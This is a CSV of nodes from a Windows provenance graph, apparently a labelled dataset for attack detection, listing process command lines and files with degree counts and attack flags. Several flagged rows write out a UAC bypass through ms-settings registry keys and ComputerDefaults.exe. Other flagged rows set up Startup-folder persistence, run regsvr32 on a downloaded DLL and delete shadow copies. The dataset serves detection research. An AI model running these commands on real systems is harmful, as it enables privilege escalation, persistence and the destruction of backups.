uuid,annotation,node_order,is_attack_node,in_degree_subgraph,out_degree_subgraph,total_degree_subgraph,in_degree_full,out_degree_full,total_degree_full
f73ed0f6-5c4f-4968-b48f-0ad9bfd7dfcb,"{'subject': '""C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26010.5-0\\MsMpEng.exe""'}",368,False,0,12,12,0,7812,7812
d0bedf01-a23c-439b-8733-62a2eba50520,"{'subject': '""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"" --no-startup-window'}",341,False,0,440,440,0,440,440
efc8e9cd-038a-4290-9d7d-6cc4a9e1c702,{'subject': 'C:\\Windows\\Explorer.EXE'},286,False,0,166,166,0,166,166
f561436b-c33f-4223-9aa5-384233be9016,"{'subject': 'cmd /k """"C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\..\\init.bat"" ""'}",982,False,0,3,3,0,78,78
b2149f66-e885-4e67-991c-ffb62befc963,"{'subject': '""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=zh-CN --service-sandbox-type=none --no-pre-read-main-dll --startup-read-main-dll --metrics-shmem-handle=2380'}",345,False,0,69,69,0,69,69
86600a8f-f7f5-4622-848b-007eb393b69a,"{'subject': '""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""  -Command ""Get-Host'}",1646,False,0,39,39,0,56,56
7c7166d2-1f53-4421-a16e-ee9a8492baca,"{'subject': 'powershell.exe -Command ""Start-Process \\""C:\\Windows\\System32\\ComputerDefaults.exe\\""""'}",8445,True,0,52,52,0,52,52
0e276fa8-de4c-4c03-b0b1-737e0debadf3,"{'subject': '""C:\\Windows\\system32\\SearchProtocolHost.exe"" Global\\UsGthrFltPipeMssGthrPipe11_ Global\\UsGthrCtrlFltPipeMssGthrPipe11 1 -2147483646 ""Software\\Microsoft\\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc"" ""DownLevelDaemon"" '}",393,False,0,4,4,0,49,49
a46b38b6-90ab-44bf-9615-2e13b648e26b,"{'subject': 'powershell.exe -Command ""New-Item -ItemType Directory -path \\""$env:APPDATA\\Microsoft\\Windows\\Update\\\\\\""""'}",7052,True,0,47,47,0,47,47
661791d2-3887-475f-90f8-083e6b6dae6c,"{'subject': 'powershell.exe -Command ""New-Item \\""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\"" -Force""'}",8087,True,0,45,45,0,45,45
037730a3-5d83-4573-b8db-47cae3812750,"{'subject': '""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""  -Command ""$ProgressPreference=\'SilentlyContinue\' ; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 ; Invoke-WebRequest -Headers @{\\""cache-control\\""=\\""no-cache\\""} -UseBasicParsing https://api.github.com/repos/chrisant996/clink/releases/latest'}",1707,False,0,39,39,0,44,44
834e9c5b-9489-47de-b2b5-fe8f4c13a017,"{'subject': 'powershell.exe -Command ""Copy-Item -path \\""C:\\Users\\victim\\Downloads\\PERFECT_AGLET.exe\\"" -destination \\""$env:APPDATA\\Microsoft\\Windows\\Update\\\\\\""""'}",7209,True,0,44,44,0,44,44
d58fa455-9721-441e-8fdd-87ddc9d75570,"{'subject': '""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""  -Command ""$ProgressPreference=\'SilentlyContinue\' ; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 ; Invoke-WebRequest \'https://github.com/chrisant996/clink/releases/download/v1.9.17/clink.1.9.17.36e2ca.zip\' -OutFile \'C:\\Users\\victim\\AppData\\Local\\Temp\\clink\\updater\\v1.9.17.zip\'""'}",1762,False,0,35,35,0,43,43
9ecc26ac-44c3-4242-bca0-13361763d1f4,"{'subject': 'powershell.exe -Command ""Set-ItemProperty -Path  \\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\"" -Name \\""Startup\\"" -Value \\""$env:APPDATA\\Microsoft\\Windows\\Update\\\\\\""""'}",7299,True,0,42,42,0,42,42
d10d9508-dd97-4bc8-b763-3df874e80d7a,"{'subject': 'powershell.exe -Command ""New-ItemProperty \\""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\"" -Name \\""DelegateExecute\\"" -Value \\""\\"" -Force""'}",8213,True,0,42,42,0,42,42
6dacfb76-d4c6-4c60-8435-2cb3e3815b6a,"{'subject': 'powershell.exe -Command ""Set-ItemProperty \\""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\"" -Name \\""(default)\\"" -Value \\""C:\\Users\\victim\\Downloads\\PERFECT_AGLET.exe\\"" -Force""'}",8337,True,0,41,41,0,41,41
2106ee4f-f2fb-4374-9c8e-c28039c5aa92,{'file': 'cmd.exe'},983,False,33,0,33,33,0,33
5307bff3-0cec-4c04-90d4-8aa56d192a4c,{'file': 'C:\\Windows\\System32\\cmd.exe'},984,False,31,0,31,31,0,31
8eb693dc-6738-4a06-bbbd-af6d9569c698,{'file': 'conhost.exe'},977,False,29,0,29,29,0,29
aad9248c-c0f5-45e8-8b07-e27e2d44236a,{'subject': 'C:\\Windows\\System32\\RuntimeBroker.exe -Embedding'},313,False,0,9,9,0,23,23
d6dcf581-6148-494c-8713-e7f557ef7cd2,{'file': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'},342,False,3,0,3,21,0,21
555e815a-6b8e-4891-9049-3f928eecd9c7,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences'},775,False,10,9,19,10,9,19
6d41fe72-e7dc-48c7-835a-20352b6c94a9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State'},778,False,9,8,17,9,8,17
ac2b3d97-8138-46c6-a1bb-1047540d5881,{'file': 'C:\\Windows\\Fonts\\staticcache.dat'},943,False,12,0,12,14,0,14
064bf9f2-29de-4bcc-baf0-07295ce58a74,{'file': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'},1645,False,14,0,14,14,0,14
cd6f9fcf-18aa-4f42-9761-dbe72a90404b,{'file': 'powershell.exe'},1647,False,14,0,14,14,0,14
6ceae84c-3624-4b1a-b58a-24c11f0a00db,{'file': 'i:WofCompressedDat'},599,False,13,0,13,13,0,13
5b322267-9364-4de0-81b5-d410230e60a3,"{'subject': '/Icon ""C:\\Users\\victim\\Desktop\\cmder\\icons\\cmder.ico"" /title ""Cmder""'}",954,False,0,3,3,0,13,13
e88c4fc3-e73e-4c65-b084-6c5896000bf8,{'file': '\\Device\\Mup\\;VBoxMiniRdr\\'},944,False,12,0,12,12,0,12
946c3f29-0b87-48d9-ad1e-9175d6031e12,"{'subject': '""C:\\Windows\\system32\\SearchProtocolHost.exe"" Global\\UsGthrFltPipeMssGthrPipe13_ Global\\UsGthrCtrlFltPipeMssGthrPipe13 1 -2147483646 ""Software\\Microsoft\\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc"" ""DownLevelDaemon"" '}",1813,False,0,10,10,0,12,12
041177f0-ed94-42e2-93c8-777d0e8475a7,{'file': 'msedge.exe'},598,False,1,0,1,11,0,11
08340148-99f1-4c70-85c6-e5bc558c6d4b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Network Persistent State'},912,False,6,5,11,6,5,11
217aa97c-ac38-434c-ab0b-99db253e585a,"{'subject': '""C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\ConEmuC64.exe"" -download -async ""Y"" https://conemu.github.io/version.ini ""ConEmuVersion.ini""'}",974,False,0,1,1,0,11,11
4fcf0af1-2d6d-4c52-929b-5863c1ddb3cf,{'subject': 'C:\\Windows\\System32\\RuntimeBroker.exe -Embedding'},312,False,0,6,6,0,10,10
b2139d89-4a69-4a9d-a4ce-e5e8ccd8a6c0,{'file': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe.config'},1649,False,10,0,10,10,0,10
641fcc54-fb4c-4531-aed9-13cee56cfd27,{'file': 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\machine.config'},1650,False,10,0,10,10,0,10
05be213e-0691-4ce8-94c2-0cf2cb74063c,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\6078762b90671c2ff9ba39318e2176d8\\mscorlib.ni.dll.aux'},1651,False,10,0,10,10,0,10
bc80cfbf-988b-48d8-a5bb-5b0dbf8121b9,{'file': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe.Config'},1653,False,10,0,10,10,0,10
004b26a0-5717-4595-8bde-dfa00e41af25,{'file': 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\config\\machine.config'},1654,False,10,0,10,10,0,10
9122a9fe-8f82-49cb-ac06-ee737c750436,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Pb378ec07#\\b544be25f624a3b9d2f98e8788f0acf8\\Microsoft.PowerShell.ConsoleHost.ni.dll.aux'},1655,False,10,0,10,10,0,10
2b4f78b1-a167-4646-a7cc-e13abec00dc1,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\65ad3055b627c2179fb80d620e7f835d\\System.Management.Automation.ni.dll.aux'},1657,False,10,0,10,10,0,10
83962e7e-a3a8-46db-9115-885bea69c014,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\b187b7f31cee3e87b56c8edca55324e0\\System.ni.dll.aux'},1660,False,10,0,10,10,0,10
9226d198-e337-4dc0-8871-f6df63245573,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Core\\570b7aac439a9e98f47d508ba4ab1330\\System.Core.ni.dll.aux'},1662,False,10,0,10,10,0,10
9b34f9d5-0fa0-4262-b576-3bf35b621472,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Mf49f6405#\\b79ea37bb757f47a2487170103f96214\\Microsoft.Management.Infrastructure.ni.dll.aux'},1665,False,10,0,10,10,0,10
a61d4d11-8842-4f74-a9c8-5519073c19a2,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Numerics\\ce1e4670373608336100bea63bbc8990\\System.Numerics.ni.dll.aux'},1666,False,10,0,10,10,0,10
230d47b5-e1a4-41b2-aac8-0219bd9e9d22,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Xml\\db3df155ec9c0595b0198c4487f36ca1\\System.Xml.ni.dll.aux'},1667,False,10,0,10,10,0,10
2f018020-7969-49f0-afd7-caf27993ac19,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Dired13b18a9#\\e9e64b91c0e4559f01e50ac43ffb9a2a\\System.DirectoryServices.ni.dll.aux'},1668,False,10,0,10,10,0,10
c3e68a05-03a1-4fa3-891c-b03ce5180820,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Management\\8af759007c012da690062882e06694f1\\System.Management.ni.dll.aux'},1670,False,10,0,10,10,0,10
1fe8447d-76aa-4387-876b-cb582beb7f19,{'file': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psm1'},1672,False,10,0,10,10,0,10
11b6f1a4-cff5-42bb-b9b2-c5dbf68de86e,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Data\\81e16f376ae576af01d03f568d0eb7c7\\System.Data.ni.dll.aux'},1675,False,10,0,10,10,0,10
320c34bc-7cf6-4786-b0a7-8cce54e0d50d,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Configuration\\5f4650136157b1ab3ef2655cd0808eee\\System.Configuration.ni.dll.aux'},1681,False,10,0,10,10,0,10
10398c9d-3713-495a-ba10-947082300fcf,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.P6f792626#\\e5e6eb1d6846fdcdee4320a83bef1e52\\Microsoft.PowerShell.Security.ni.dll.aux'},1682,False,10,0,10,10,0,10
d7588e36-bd31-4514-a32f-d4234db3e9d5,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Transactions\\ce574ae4e11a47e97df21426503a82c9\\System.Transactions.ni.dll.aux'},1683,False,10,0,10,10,0,10
c2210e52-a397-4bb1-9c3b-6d4265590cc3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\ModuleAnalysisCache'},1688,False,10,0,10,10,0,10
5b712027-eb26-4e03-9328-9a0bc04e4159,{'file': 'C:\\Program Files\\WindowsPowerShell\\Modules\\Microsoft.PowerShell.Operation.Validation\\1.0.1\\Microsoft.PowerShell.Operation.Validation.psd1'},1689,False,10,0,10,10,0,10
e3e3bfa3-ba24-489e-9f17-eeac7a206c9c,{'file': 'C:\\Program Files\\WindowsPowerShell\\Modules\\PackageManagement\\1.0.0.1\\PackageManagement.psd1'},1690,False,10,0,10,10,0,10
d3d60c0a-d229-453c-a516-57db2d2bbae4,{'file': 'C:\\Program Files\\WindowsPowerShell\\Modules\\Pester\\3.4.0\\Pester.psd1'},1691,False,10,0,10,10,0,10
692ae70a-2ffc-44bd-8172-ddaf125b05cb,{'file': 'C:\\Program Files\\WindowsPowerShell\\Modules\\Pester\\3.4.0\\Pester.psm1'},1692,False,10,0,10,10,0,10
c76879c9-c889-4299-b757-a5f5d599abee,{'file': 'C:\\Program Files\\WindowsPowerShell\\Modules\\PowerShellGet\\1.0.0.1\\PowerShellGet.psd1'},1694,False,10,0,10,10,0,10
50d69d43-3545-4dd1-85fd-09e0299ba01d,{'file': 'C:\\Program Files\\WindowsPowerShell\\Modules\\PowerShellGet\\1.0.0.1\\PSModule.psm1'},1695,False,10,0,10,10,0,10
01996f26-6e7b-4296-bdd3-522c043313f5,{'file': 'C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\PSReadline.psd1'},1696,False,10,0,10,10,0,10
d65ae5c6-dc31-4b6f-988a-9c0f11fdd5fa,{'file': 'C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psd1'},1697,False,10,0,10,10,0,10
d4f4c13a-35c3-4be0-b642-728259d07143,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Confe64a9051#\\434f871c532673e1359654ad68a1c225\\System.Configuration.Install.ni.dll.aux'},1700,False,10,0,10,10,0,10
da7bd8ba-8602-4c3f-9470-66c8add515a6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive'},1705,False,10,0,10,10,0,10
d792fb05-b79a-4852-8a4f-09cf024aa0c0,"{'subject': '""C:\\Windows\\SystemApps\\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewy\\CHXSmartScreen.exe"" -ServerName:App.AppXk7vvv12h4qrkhkbvf6j86ja45mzj5km9.mca'}",10320,False,0,3,3,0,9,9
245d5d4d-88ca-4255-8494-09603689f98c,{'subject': 'regsvr32  C:\\Users\\victim\\Downloads\\REASONABLE_GRASS.dll'},1777,True,0,8,8,0,8,8
6e90d057-e0cc-4839-885c-c1623ac1e359,{'file': 'C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Management\\Microsoft.PowerShell.Management.psd1'},7174,False,7,0,7,7,0,7
6267348e-369a-43da-bafc-f734632b0024,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Pae3498d9#\\540be536249c14bcd4d722f9edf5d2b8\\Microsoft.PowerShell.Commands.Management.ni.dll.aux'},7176,False,7,0,7,7,0,7
4d7de498-6fe8-4881-a9f2-f5e23e62e1a8,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Serv759bfb78#\\e2ca4e2ddffdc0d0bda3f2ca65249790\\System.ServiceProcess.ni.dll.aux'},7180,False,7,0,7,7,0,7
c5cdf522-199e-4fe1-8775-6fed96488019,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Windows.Forms\\8162fd84baf0b737d3f6b4a159c8fcf0\\System.Windows.Forms.ni.dll.aux'},7184,False,7,0,7,7,0,7
373ffb10-be01-4ab3-a03e-8df873a0dcd5,{'file': '\\Device\\HarddiskVolume1\\Windows\\System32\\winspool.drv'},236,False,6,0,6,6,0,6
d96b70fe-06c6-4672-a9df-87829b434039,{'subject': 'C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s wuauserv'},268,False,0,1,1,0,6,6
5e1c808f-c45f-44bd-a1ae-4fdb94906b8f,{'file': '\\Device\\HarddiskVolume1\\Windows\\System32\\WinMetadata\\Windows.Foundation.winmd'},304,False,2,0,2,6,0,6
ea67f9a5-7457-4a87-90ac-bcc5949e685c,{'file': 'C:\\Users\\victim\\Desktop\\desktop.ini'},600,False,6,0,6,6,0,6
a5f1ff09-4240-43be-8c6e-fe9aa85546ae,{'file': 'C:\\Users\\victim\\Downloads\\desktop.ini'},605,False,6,0,6,6,0,6
049f1d28-ac75-4cbb-ad04-ce9a62f5bc81,{'subject': 'C:\\Windows\\system32\\cmd.exe /c post-install.bat'},1107,False,0,2,2,0,6,6
8843fb93-af95-4ba6-941c-6948c292efcd,{'file': 'C:\\Users\\victim\\Downloads\\PERFECT_AGLET.exe'},2705,True,6,0,6,6,0,6
28002c65-863f-492b-b732-a98f33faecdb,"{'subject': '""C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26010.5-0\\MpCmdRun.exe"" SignatureUpdate -ScheduleJob -RestrictPrivileges'}",2714,False,0,1,1,0,6,6
b085d1af-3c4c-4161-9cb9-ea1c932d0272,{'subject': 'consent.exe 9988 384 000001D65B458520'},10418,False,0,6,6,0,6,6
333e8522-2579-496a-b590-2f07cd47afc5,"{'subject': 'cmd.exe /c ""wmic.exe shadowcopy delete""'}",10645,True,0,6,6,0,6,6
44358bf9-5515-4cb8-9bca-653ff7a14095,{'file': '\\Device\\HarddiskVolume1\\Windows\\System32\\WinMetadata\\Windows.UI.winmd'},310,False,2,0,2,5,0,5
1c28bd82-ee25-4536-b908-e7c8cf2d2e2b,{'file': 'C:\\Users\\desktop.ini'},888,False,5,0,5,5,0,5
8b750003-b0f7-445e-a38b-95b956113fe9,"{'subject': '""C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\ConEmuC64.exe""  /CINMODE=600020 /AID=8704 /GID=3672 /GHWND=000705F8 /BW=230 /BH=53 /BZ=1000 ""/FN=Lucida Console"" /FW=3 /FH=5 /TA=10100007 /HIDE /ROOT cmd /k """"%ConEmuDir%\\..\\init.bat"" ""'}",978,False,0,2,2,0,5,5
8fd7a70c-729d-46fa-935b-4c2eea979f24,"{'subject': 'C:\\Windows\\System32\\find  /i "" ""'}",993,False,0,1,1,0,5,5
2f7bdf8f-4e19-466d-85b0-543e22f5b0da,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\6078762b90671c2ff9ba39318e2176d8\\mscorlib.ni.dll'},1652,False,5,0,5,5,0,5
937643fb-ca8e-4afd-afd1-f344da5aa0fe,{'subject': 'whoami'},1783,False,0,3,3,0,5,5
d6a523b5-3afc-4051-ac35-20002b78f058,"{'subject': '""C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26010.5-0\\MpCmdRun.exe"" Scan -ScheduleJob -RestrictPrivileges -ScanType 1 -ScanTrigger 59'}",2719,False,0,1,1,0,5,5
55e72444-2d75-44a9-b0a7-427742e0d0ad,{'file': 'C:\\Windows\\system32\\netprofm.dll'},3162,False,1,0,1,5,0,5
7ecf2a5d-5295-4e46-a1b3-5ff32e564a8a,{'subject': 'wmic.exe  shadowcopy delete'},10648,False,0,3,3,0,5,5
e02ab5d2-48c2-4dbc-80c8-067e23c8217a,{'file': 'C:\\Users\\victim\\Documents\\desktop.ini'},601,False,4,0,4,4,0,4
af2d1fc1-2d41-4006-b65b-5edb2a4783bc,{'file': 'C:\\Users\\victim\\Music\\desktop.ini'},602,False,4,0,4,4,0,4
6e1cbe73-19e2-491e-9766-eb025080775f,{'file': 'C:\\Users\\victim\\Pictures\\desktop.ini'},603,False,4,0,4,4,0,4
bd87a822-b961-4a2a-9d6e-a9bbfebfa4a9,{'file': 'C:\\Users\\victim\\Videos\\desktop.ini'},604,False,4,0,4,4,0,4
22eac536-0d8d-406e-a73b-1dbef8becabf,{'file': 'C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\f01b4d95cf55d32a.automaticDestinations-ms'},891,False,4,0,4,4,0,4
1f78507d-6bf9-45ce-8ee0-26deeb7f6418,{'file': 'C:\\Users\\victim\\Desktop\\cmder\\Cmder.exe'},925,False,1,0,1,4,0,4
f7ce6549-0332-4475-ae0d-592ab6abcbdd,{'file': 'e:Zone.Identifie'},929,False,2,0,2,4,0,4
475333e5-b54d-41bf-933f-1ca94d6291c3,{'subject': 'C:\\Windows\\system32\\cmd.exe /c where git.exe 2>nul'},1040,False,0,2,2,0,4,4
90290424-49a0-4afe-a87d-39c7818698fe,{'subject': 'where  git.exe '},1042,False,0,1,1,0,4,4
68de5744-916c-4b36-bdde-6fc604a5a1a9,"{'subject': 'C:\\Windows\\system32\\cmd.exe /c ""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\usr\\bin\\locale.exe"" -uU 2'}",1069,False,0,2,2,0,4,4
4bb1eee0-1f8d-4dbf-9ed2-1f5530ea7073,"{'subject': '""C:\\Users\\victim\\Desktop\\cmder\\vendor\\git-for-windows\\git-cmd.exe""  --no-needs-console --no-cd --command=post-install.bat'}",1104,False,0,1,1,0,4,4
10321061-6426-47f8-8879-05c41e4130d5,{'subject': 'C:\\Windows\\system32\\cmd.exe /c 2>nul git --no-optional-locks config --get-regexp alias'},1625,False,0,2,2,0,4,4
e5f9d5ed-78cc-455b-b6a1-38d5381b7d03,"{'subject': 'C:\\Windows\\system32\\cmd.exe /c 2>&1 ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" -Command ""Get-Host'}",1644,False,0,4,4,0,4,4
83c5a030-6110-4273-918f-fd311d007d38,{'file': 'C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll'},1658,False,4,0,4,4,0,4
48a32b70-9ad1-4c4d-a1be-781881de3f3a,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.P521220ea#\\13ba5d4f4a12b25a15d07feb275cb6f0\\Microsoft.PowerShell.Commands.Utility.ni.dll.aux'},1698,False,4,0,4,4,0,4
a57cffd8-a26d-4c62-b6ea-de8b03cece14,{'file': 'C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psm1'},1702,False,4,0,4,4,0,4
86d79af1-992f-45a4-a361-570d8c6a3687,"{'subject': 'C:\\Windows\\system32\\cmd.exe /c 2>&1 ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" -Command ""$ProgressPreference=\'SilentlyContinue\' ; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 ; Invoke-WebRequest -Headers @{\\""cache-control\\""=\\""no-cache\\""} -UseBasicParsing https://api.github.com/repos/chrisant996/clink/releases/latest'}",1706,False,0,4,4,0,4,4
63940dfb-94db-43ff-8854-d1da1af83675,"{'subject': 'C:\\Windows\\system32\\cmd.exe /c 2>&1 ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" -Command ""$ProgressPreference=\'SilentlyContinue\' ; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 ; Invoke-WebRequest \'https://github.com/chrisant996/clink/releases/download/v1.9.17/clink.1.9.17.36e2ca.zip\' -OutFile \'C:\\Users\\victim\\AppData\\Local\\Temp\\clink\\updater\\v1.9.17.zip\'""'}",1761,False,0,4,4,0,4,4
10361170-02cd-4bd6-a5d1-da394119e99c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Packages\\Microsoft.Windows.Search_cw5n1h2txyewy\\LocalState\\ShellFeeds\\IDX_CONTENT_TASKBARHEADLINES.json'},1830,False,1,0,1,3,1,4
1b2e9ff2-99d6-4da9-a0be-5960f9c212b3,"{'subject': '""C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26010.5-0\\MpCmdRun.exe"" SignaturesUpdateService -ScheduleJob -UnmanagedUpdate'}",2728,False,0,1,1,0,4,4
3fb35a1a-8e3d-4e87-941f-bc1571a8ad52,"{'subject': '""C:\\Windows\\System32\\ComputerDefaults.exe"" '}",8555,False,0,4,4,0,4,4
fac9a9e5-0661-4a19-95ff-95968d7fed4e,"{'subject': '""C:\\Windows\\system32\\dmclient.exe"" utcwnf'}",9961,False,0,1,1,0,4,4
0e56a93f-1429-49b0-8c35-9186bcac0353,{'subject': 'C:\\Windows\\system32\\msiexec.exe /V'},383,False,0,1,1,0,3,3
7d14e548-4efd-4bf6-84e7-cd3228eff8ef,{'file': 'C:\\Users\\victim\\OneDrive\\desktop.ini'},606,False,3,0,3,3,0,3
3c5ca7f2-f43f-4ea7-8739-03ea6daceaf1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\todelete_671feb07fca38274_0_1'},701,False,2,0,2,3,0,3
41b36d15-db35-451f-8608-a1019047a097,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\TransportSecurity'},771,False,2,1,3,2,1,3
b6c0f252-d669-4d44-971b-efcbace4fec9,{'file': 'identity_helper.exe'},840,False,1,0,1,3,0,3
6dd1c3f6-aaf1-4b78-a81b-b7db54da0cce,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Feature Engagement Tracker\\AvailabilityDB\\LOG.old'},849,False,2,1,3,2,1,3
1344710f-32ac-4b6d-8d61-a78c9bf0d519,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Feature Engagement Tracker\\EventDB\\LOG.old'},853,False,2,1,3,2,1,3
61abbdd2-d7fc-41ff-a13e-6abe5e93663d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\ScriptCache\\index-dir\\the-real-index'},872,False,2,1,3,2,1,3
c23d7c48-3212-4ca5-b250-aa479ad4e4ab,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\index-dir\\the-real-index'},877,False,2,1,3,2,1,3
809d6183-d5c6-41b3-b60e-14081c4bbaa2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\index.txt'},880,False,2,1,3,2,1,3
34a4b7e8-0a6a-4f9b-8f0e-93a2f33673e9,{'file': 'C:\\$RECYCLE.BIN\\S-1-5-21-3344029263-1063349748-2086425053-1000\\desktop.ini'},889,False,3,0,3,3,0,3
0168ec71-b437-4bad-829b-e7a8f9211c4f,{'file': 'C:\\Users\\victim\\Downloads\\未确认 948164.crdownload'},890,False,2,1,3,2,1,3
b7a14230-b942-4645-9f0b-d94e561b04b6,{'file': 'C:\\Windows\\System32\\stdole2.tlb'},921,False,1,0,1,3,0,3
27460f48-08df-4e8b-b22f-5186ab8557aa,{'file': 'consent.exe'},935,False,1,0,1,3,0,3
b8e6fc1c-eac2-456f-9c41-f10df89f204c,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},976,False,0,2,2,0,3,3
4548615c-7e1c-4f03-91a4-c078d9028730,"{'subject': 'C:\\Windows\\system32\\cmd.exe /c type ""C:\\Users\\victim\\AppData\\Local\\Temp\\git_version.txt"" 2>nul'}",1039,False,0,2,2,0,3,3
5411840f-1f10-45aa-8fe4-f60dd168a281,"{'subject': 'findstr  -i ""\\.COM \\.EXE \\.BAT \\.CMD \\.PS1 \\.VBS"" '}",1049,False,0,1,1,0,3,3
d2e76e5c-fc56-4f64-bbac-23177de1ff8a,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" type ""C:\\Users\\victim\\Desktop\\cmder\\config\\user_aliases.cmd"" ""'}",1096,False,0,2,2,0,3,3
4fad691c-bab1-4db4-92be-4c6fc369c8c9,"{'subject': 'C:\\Windows\\system32\\doskey  /listsize=1000 /macrofile=""C:\\Users\\victim\\Desktop\\cmder\\config\\user_aliases.cmd""'}",1100,False,0,1,1,0,3,3
